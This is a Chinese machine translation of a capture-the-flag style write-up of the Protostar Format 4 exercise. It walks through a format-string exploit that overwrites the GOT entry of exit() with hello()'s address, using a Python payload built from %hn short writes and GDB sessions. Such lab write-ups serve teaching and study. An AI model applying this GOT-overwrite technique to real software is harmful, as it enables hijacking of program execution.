<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 4</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习| Protostar |格式4</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-4-e2907b4716d1?source=collection_archive---------2-----------------------#2020-06-08">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-4-e2907b4716d1?source=collection_archive---------2-----------------------#2020-06-08</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/ceaf1b32cd6771632e8837d376cfaa36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7r32PQ2t6XWklu5L.png"/></div></div></figure><h1 id="868a" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">格式4(格式字符串漏洞:GOT)</h1><p id="3480" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">该挑战的目标是通过利用全局偏移表(“GOT”)而不是我们在之前的格式字符串漏洞挑战中使用的返回指针，重定向我们的执行流以打印获胜的语句。让我们看看我们如何做到这一点:)</p><ul class=""><li id="f0ff" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">链接:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format4/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format4/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/b03ad914c88216cc76f7d0c5e6e31602.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VaziLtnu_7ncNFi_9UbbPg.png"/></div></div></figure><h2 id="eef6" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">注意事项</h2><ul class=""><li id="1354" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">char buffer[512]</strong></code>:设置缓冲区大小为512。</li><li id="a803" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">fgets(buffer, sizeof(buffer), stdin)</strong></code>:获取用户提供的输入。并且它将缓冲区大小限制为512。我们可以最大输入511个字节，因为C总是在字符串末尾添加<code class="fe nd ne nf ng b">0x00</code>作为终止符。</li><li id="feda" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(buffer);</strong></code>:这是这段代码中易受攻击的函数。<code class="fe nd ne nf ng b">printf()</code>将<em class="nm">而非</em>检查所提供的输入是否是预期的格式字符串，因为它被编码为接受任何字符串值。所以我们能做的就是简单地验证我们是否可以泄漏内存地址，并且也可以将任意代码写到堆栈上(<strong class="lb iu">【读取】</strong> <code class="fe nd ne nf ng b">%p</code>或者<code class="fe nd ne nf ng b">%x</code> → <strong class="lb iu">【写入】</strong> <code class="fe nd ne nf ng b">%n</code>)。</li><li id="4e7b" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">exit(1);</strong></code>:<code class="fe nd ne nf ng b">exit(1)</code>是一个系统调用，它简单地退出程序。与之前的练习不同，我们在<code class="fe nd ne nf ng b">printf()</code>之后没有任何返回地址；相反，我们有这个<code class="fe nd ne nf ng b">exit(1)</code>。但是我们可以做的是，由于<code class="fe nd ne nf ng b">exit(1)</code>是全局偏移表(“GOT”)的一部分，我们可以用<code class="fe nd ne nf ng b">hello()</code>的地址覆盖它的<code class="fe nd ne nf ng b">exit(1)</code>函数的入口点，以打印出获胜的语句。</li></ul><h2 id="ab63" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">有什么？</h2><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nn"><img src="../Images/ed9da8f06f7568698314e29c9841d9b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Et-fcoEbEEzd-K-aNwtIOQ.png"/></div></div><figcaption class="no np gj gh gi nq nr bd b be z dk translated">来源:<a class="ae mi" href="https://ctf101.org/binary-exploitation/what-is-the-got/" rel="noopener ugc nofollow" target="_blank">https://ctf101.org/binary-exploitation/what-is-the-got/</a></figcaption></figure><p id="420e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">简单地说，GOT帮助在动态链接的ELF二进制文件中加载共享库函数(例如<code class="fe nd ne nf ng b">exit()</code>)。基本上，一个人可以创建他们的程序，而不需要重新编写像<code class="fe nd ne nf ng b">exit()</code>这样的流行函数；相反，它们可以添加指针来调用这些函数，因为它们可以在运行时动态加载。下面是ASM文件示例:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nv"><img src="../Images/bd0405092aaac927ebc7d3340ab4ad83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4Msz3kGs2wkQy_d54UHn0g.png"/></div></div><figcaption class="no np gj gh gi nq nr bd b be z dk translated">来源:<a class="ae mi" href="https://github.com/bigb0sss/b0ssTheASM/blob/master/0x06_libc/libc_01.nasm" rel="noopener ugc nofollow" target="_blank">https://github . com/big B0 SSS/b 0 ssheasm/blob/master/0x 06 _ libc/libc _ 01 . nasm</a></figcaption></figure></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h1 id="bf0b" class="kb kc it bd kd ke od kg kh ki oe kk kl km of ko kp kq og ks kt ku oh kw kx ky bi translated">拆解(GDB)</h1><p id="126f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们反汇编二进制文件，看看在ASM级别做了什么。</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="5d34" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ gdb -q /opt/protostar/bin/format4</strong><br/>Reading symbols from /opt/protostar/bin/format4...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel <br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oq"><img src="../Images/a5199cffe85bd327d50d7223666bf06f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EjlJp-j2XuqH5V3y_jBTtA.png"/></div></div></figure><p id="af4c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">从源代码的角度来看，程序本身非常简单。我们现在只需要记下<code class="fe nd ne nf ng b">exit()</code>函数(<code class="fe nd ne nf ng b">0x8049724</code>)的入口地址。</p></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h1 id="fdd8" class="kb kc it bd kd ke od kg kh ki oe kk kl km of ko kp kq og ks kt ku oh kw kx ky bi translated">剥削</h1><h2 id="0de1" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">初步侦察</h2><p id="7b5d" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">像往常一样，让我们提供一些随机的字符串:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="c89a" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA"' | /opt/protostar/bin/format4</strong><br/>AAAA</span></pre><p id="925b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">打印出我们输入的任何字符串。但是如果提供一些格式字符串参数(<code class="fe nd ne nf ng b">%08x</code>，我们会得到一些有趣的输出:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="bb8d" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420</span><span id="3bd4" class="mo kc it ng b gy or on l oo op"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%08x"</em></strong><em class="nm"> = "%x" is a Format String parameter of the hexdecimal <br/>         representation. <br/>         The number "08" is the minimum value for "width field."<br/>         This will pad the output of the "%x" specified to 8<br/>         characters, which is equal to 4 bytes long.</em></span></pre><h2 id="c788" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找偏移</h2><p id="c34e" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">接下来，我们需要找到在堆栈上可以看到我们提供的输入的偏移量。如果我们尝试增加几个<code class="fe nd ne nf ng b">%x</code>，我们可以发现偏移量为4。</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="4723" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 3' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420|bffff5f4</span><span id="3212" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420|bffff5f4|<strong class="ng iu">41414141    &lt;-- chr(0x41) = "A"</strong></span></pre><h2 id="1cd2" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">确认对GOT条目的写入</h2><p id="50bd" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">如果您有疑问，让我们确认一下我们是否可以覆盖<code class="fe nd ne nf ng b">exit(1)</code> GOT ( <code class="fe nd ne nf ng b">0x8049724</code>，<em class="nm">我们从上面的“拆卸(GDB)”部分获得了这个地址🙂</em>同此。为此，我们需要创建一个简单的漏洞利用脚本:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="30bd" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">[exploit.py]</strong></span><span id="a31b" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="0ce4" class="mo kc it ng b gy or on l oo op">import struct</span><span id="653b" class="mo kc it ng b gy or on l oo op">exit_plt = 0x8049724                      <strong class="ng iu"># Entry of exit(1) GOT</strong></span><span id="159f" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)       <br/>exploit+= "%4$08n"                        <strong class="ng iu"># Write a number of <br/>                                            characters in the 4th <br/>                                            location (= offset)</strong></span><span id="5c14" class="mo kc it ng b gy or on l oo op">print exploit</span></pre><p id="18cc" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">将这个文件作为输出，这样我们就可以将它输入到gdb中:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="5e57" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python exploit.py &gt; exploit</strong></span></pre><p id="b7ce" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">运行gdb，在<code class="fe nd ne nf ng b">printf()</code>和<code class="fe nd ne nf ng b">exit()</code>系统调用上设置断点，并提供我们的<code class="fe nd ne nf ng b">exploit</code>输出:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="db88" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ gdb -q /opt/protostar/bin/format4 </strong><br/>  Reading symbols from /opt/protostar/bin/format4...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel </strong><br/><strong class="ng iu">(gdb) disassemble vuln</strong><br/>Dump of assembler code for function vuln:<br/>  0x080484d2 &lt;vuln+0&gt;: push   ebp<br/>  0x080484d3 &lt;vuln+1&gt;: mov    ebp,esp<br/>  0x080484d5 &lt;vuln+3&gt;: sub    esp,0x218<br/>  0x080484db &lt;vuln+9&gt;: mov    eax,ds:0x8049730<br/>  0x080484e0 &lt;vuln+14&gt;: mov    DWORD PTR [esp+0x8],eax<br/>  0x080484e4 &lt;vuln+18&gt;: mov    DWORD PTR [esp+0x4],0x200<br/>  0x080484ec &lt;vuln+26&gt;: lea    eax,[ebp-0x208]<br/>  0x080484f2 &lt;vuln+32&gt;: mov    DWORD PTR [esp],eax<br/>  0x080484f5 &lt;vuln+35&gt;: call   0x804839c &lt;fgets@plt&gt;<br/>  0x080484fa &lt;vuln+40&gt;: lea    eax,[ebp-0x208]<br/>  0x08048500 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax<br/>  <strong class="ng iu">0x08048503 &lt;vuln+49&gt;: call   0x80483cc &lt;printf@plt&gt;   &lt;-- Break 1</strong><br/>  0x08048508 &lt;vuln+54&gt;: mov    DWORD PTR [esp],0x1<br/>  <strong class="ng iu">0x0804850f &lt;vuln+61&gt;: call   0x80483ec &lt;exit@plt&gt;     &lt;-- Break 2</strong><br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) break * 0x08048503</strong><br/>  Breakpoint 1 at 0x8048503: file format4/format4.c, line 20.<br/><strong class="ng iu">(gdb) break * 0x0804850f</strong><br/>  Breakpoint 2 at 0x804850f: file format4/format4.c, line 22.<br/><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit </strong><br/>  Starting program: /opt/protostar/bin/format4 &lt; /home/user/format4. <br/>  /exploit</span><span id="4a5e" class="mo kc it ng b gy or on l oo op">  Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20<br/>  20 format4/format4.c: No such file or directory.<br/><strong class="ng iu">(gdb) disassemble 0x80483ec                   &lt;-- Disassemble exit()</strong><br/>  Dump of assembler code for function exit@plt:<br/>  0x080483ec &lt;exit@plt+0&gt;: jmp    DWORD PTR ds:<strong class="ng iu">0x8049724</strong><br/>  0x080483f2 &lt;exit@plt+6&gt;: push   0x30<br/>  0x080483f7 &lt;exit@plt+11&gt;: jmp    0x804837c<br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) x 0x8049724                  &lt;-- Examine the current GOT entry</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080483f2</strong><br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  $�</span><span id="7454" class="mo kc it ng b gy or on l oo op">  Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22<br/>  22 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724                  &lt;-- Examine the current GOT entry</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x00000004</strong></span></pre><p id="04d6" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">太好了。如您所见，从<code class="fe nd ne nf ng b">0x080483f2</code>到<code class="fe nd ne nf ng b">0x00000004</code>的有效载荷已经覆盖了GOT地址的条目。现在，我们只需要找到<code class="fe nd ne nf ng b">hello()</code>函数的地址，并更新我们的漏洞，用它来正确地覆盖get入口点。</p><h2 id="19a8" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">正在查找“hello()”的地址</h2><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="86d9" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ objdump -t /opt/protostar/bin/format4 |grep hello</strong><br/><strong class="ng iu">080484b4</strong> g     F .text 0000001e              hello</span></pre><p id="6dbf" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">找到的<code class="fe nd ne nf ng b">hello()</code>功能的地址是<code class="fe nd ne nf ng b">0x080484b4</code>。</p></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h2 id="8c42" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">最终利用(2字节短写)</h2><p id="affd" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">由此看来，这个漏洞应该与我们在<code class="fe nd ne nf ng b">Format3</code>练习<a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83" rel="noopener">和</a>中所做的非常相似。由于用宽度字段控制<code class="fe nd ne nf ng b">%n</code>很简单，我们可以使用任何技术。也就是说，我们将用2字节的短写方法来解决这个问题。</p><p id="ffe0" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">为了进一步澄清，让我快速解释一下这将如何进行:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="ae22" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">1) Our overwriting point: </strong><br/>  0x08049724 (Entry of the exit() GOT)</span><span id="5eda" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">2) Desired value that we want to overwrite with:</strong><br/>  <!-- -->0x080484b4 (hello())</span><span id="e532" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">3) 2-byte Short Write points:<br/>(gdb) x 0x8049724</strong><br/>0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080483f2</strong><br/>                                          ⬇<br/>                    0x08           <strong class="ng iu">04</strong>             83             <strong class="ng iu">f2</strong><br/>              ------------------------------------------------------<br/>              0x8049727      <strong class="ng iu">0x8049726      0x8049725      0x8049724</strong></span></pre><p id="256b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">根据上面的表示，我们将利用地址:<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049724</strong></code>和<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049726</strong></code>。来得到我们想要的值。</p><p id="d203" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">让我们验证一下，我们是否可以在这些<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049724</strong></code>和<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049726</strong></code>地址上写入任意值:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="a995" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">[exploit.py]</strong></span><span id="dba3" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="635d" class="mo kc it ng b gy or on l oo op">import struct</span><span id="c249" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724                      <br/>exit_plt2 = 0x8049726</span><span id="f7c2" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= "%4$08n"<br/>exploit+= "%5$08n"</span><span id="1ed9" class="mo kc it ng b gy or on l oo op">print exploit</span></pre><p id="fde3" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">一旦我们将上述漏洞保存到一个文件中，运行gdb来检查我们是否可以覆盖每个地址位置:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="6d79" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">### Confirming 2-byte Overwrite on GOT Entry</strong></span><span id="eb9f" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit </strong><br/>  Starting program: /opt/protostar/bin/format4 &lt; /home/user/format4 <br/>  /exploit</span><span id="09c7" class="mo kc it ng b gy or on l oo op">  Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20<br/>  20 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: 0x080483f2<br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  $&amp;�</span><span id="bf1b" class="mo kc it ng b gy or on l oo op">  Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22<br/>  22 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x00080008</strong></span></pre><p id="673a" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">很好。我们可以看到，我们的尝试在每个地址位置上都写了<code class="fe nd ne nf ng b">0x0008</code>值。现在，我们只需要计算宽度字段，以便输出我们想要的值。(<em class="nm"> * </em> <a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <em class="nm">查看</em> </a> <code class="fe nd ne nf ng b"><a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"><em class="nm">Format2</em></a></code> <a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <em class="nm">练习，了解关于宽度字段计算的更多详细说明</em> </a>)</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="d307" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">### Final Exploit</strong></span><span id="4eb1" class="mo kc it ng b gy or on l oo op">0x080484b4<!-- -->    <strong class="ng iu">&lt;-- Desired value &amp; divide this into 2</strong><br/>    ⬇  <br/>  0x<!-- -->84b4<!-- -->      <strong class="ng iu">&lt;-- We will write this on "0x8049724"</strong><br/>  0x<!-- -->0804<!-- -->      <strong class="ng iu">&lt;-- We will write this on "0x8049726"</strong><br/>    </span><span id="93d9" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[Width Calculation #1: "0x8049724"]<br/>____________________________________________________________________    <br/></strong><em class="nm"># Written value was "0008." In order to calculate the width field, we need to subtract "0008" from our desired value = "</em>0x<!-- -->84b4<em class="nm">"</em></span><span id="ca38" class="mo kc it ng b gy or on l oo op">(gdb) print 0x84b4 - 0x0008<br/>  $5 = <strong class="ng iu">33964</strong></span><span id="3ffd" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[exploit.py - Width Calculation #1]</strong></span><span id="d020" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="160d" class="mo kc it ng b gy or on l oo op">import struct</span><span id="e5b8" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724<br/>exit_plt2 = 0x8049726</span><span id="087d" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= <strong class="ng iu">"%33964x%4$hn"</strong><br/>exploit+= "%5$08n"</span><span id="2a53" class="mo kc it ng b gy or on l oo op">print exploit</span><span id="0708" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[gdb - Width Calculation #1]</strong></span><span id="c147" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit</strong><br/><em class="nm">...(snip)...</em><br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: 0x84b4<strong class="ng iu">84b4   &lt;-- Written OK</strong></span><span id="92f6" class="mo kc it ng b gy or on l oo op"><strong class="ng iu"><br/>[Width Calculation #2: "0x8049726"]<br/>____________________________________________________________________</strong><em class="nm"># From the above calculation as you can see the second 2 byte location is also filled with "84b4" which means we need to subtract that value from our desired value to get the correct width field.</em></span><span id="b7a4" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) print 0x0804 - 0x84b4</strong><br/>  $6 = -31920</span><span id="94af" class="mo kc it ng b gy or on l oo op"><em class="nm"># Holdup... Negative output? Obviously, we cannot use this negative padding. In this case, however, there is a trick that we overflow into the next byte to get our desired value on the target location. Since we have a control on the stack, we can still overwrite the overflowed value. Example below:</em></span><span id="69d2" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) print 0x10804 - 0x84b4</strong><br/>  $7 = <strong class="ng iu">33616</strong></span><span id="f335" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[exploit.py - Width Calculation #2]</strong></span><span id="d179" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="b722" class="mo kc it ng b gy or on l oo op">import struct</span><span id="7fad" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724<br/>exit_plt2 = 0x8049726</span><span id="46a4" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= "%33964x%4$hn"<br/>exploit+= <strong class="ng iu">"%33616x%5$hn"</strong></span><span id="6bbd" class="mo kc it ng b gy or on l oo op">print exploit</span><span id="e263" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[gdb - Width Calculation #2]</strong></span><span id="fa08" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit</strong><br/><em class="nm">...(snip)...</em><br/><strong class="ng iu">(gdb) x 0x8049724<br/>  </strong>0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080484b4   &lt;-- Written OK</strong><br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  <strong class="ng iu">code execution redirected! you win   &lt;-- Winning Statement!</strong></span><span id="da78" class="mo kc it ng b gy or on l oo op">  Program exited with code 01.</span></pre><p id="672c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">完美！我们成功地利用了格式字符串漏洞来覆盖<code class="fe nd ne nf ng b">exit()</code>的入口点，从而重定向我们的执行流来打印出获胜的语句。</p><p id="de0e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">我们还可以将最终的漏洞脚本直接运行到<code class="fe nd ne nf ng b">format4</code>二进制文件中:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="ccbd" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python /home/user/format4/exploit.py | /opt/protostar/bin/format4</strong><br/>...(snip of A LOT OF white spaces)...<br/>                                         b7fd8420<br/><strong class="ng iu">code execution redirected! you win</strong></span></pre><p id="5e39" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">感谢阅读！</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi os"><img src="../Images/3735507d2c93e53a5b9d4423146e377a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MkNKI5Z0om2jypTQ.png"/></div></div></figure></div></div>    
</body>
</html>